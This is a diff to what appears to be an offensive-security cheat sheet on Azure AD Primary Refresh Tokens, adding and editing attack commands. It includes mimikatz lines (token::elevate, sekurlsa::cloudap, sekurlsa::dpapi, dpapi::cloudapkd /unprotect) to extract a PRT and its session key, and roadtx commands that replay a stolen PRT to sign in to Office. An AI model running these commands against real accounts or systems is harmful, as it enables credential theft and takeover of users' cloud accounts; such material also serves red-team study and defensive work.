@@ -91,13 +91,15 @@ Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9
 
 * Use PRT token
     ```ps1
-    roadtx browserprtauth -prt roadtx.prt -url http://www.office.com
+    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
+    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
     ```
 
 
 ### Extract PRT v1
 
 ```ps1
+mimikatz # token::elevate
 mimikatz # sekurlsa::cloudap
 mimikatz # sekurlsa::dpapi
 mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
@@ -110,7 +112,7 @@ roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url 
 * No method known to date.
 
 
-### Generate a PRT by registering a device
+### Upgrade Refresh Token to PRT
 
 ```ps1
 # Get correct token audience
